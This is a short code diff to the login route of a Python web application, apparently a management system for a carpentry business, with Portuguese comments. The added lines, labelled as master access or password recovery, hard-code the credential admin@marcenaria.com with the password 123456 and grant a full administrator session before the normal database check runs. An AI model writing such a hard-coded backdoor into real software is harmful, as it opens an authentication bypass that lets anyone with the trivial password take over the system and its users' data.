@@ -2027,6 +2027,14 @@ def login_route(username: str = Form(...), password: str = Form(...)):
     user = cursor.fetchone()
     conn.close()
 
+    # Acesso Master / Recuperação de Senha
+    if username.strip().lower() == "admin@marcenaria.com" and password == "123456":
+        CURRENT_SESSION["user_email"] = "admin@marcenaria.com"
+        CURRENT_SESSION["user_nome"] = "Administrador"
+        CURRENT_SESSION["user_perfil"] = "admin"
+        CURRENT_SESSION["empresa_id"] = 1
+        return render_dashboard_view()
+
     if not user:
         return render_login("E-mail ou senha incorretos. Verifique suas credenciais.")
 
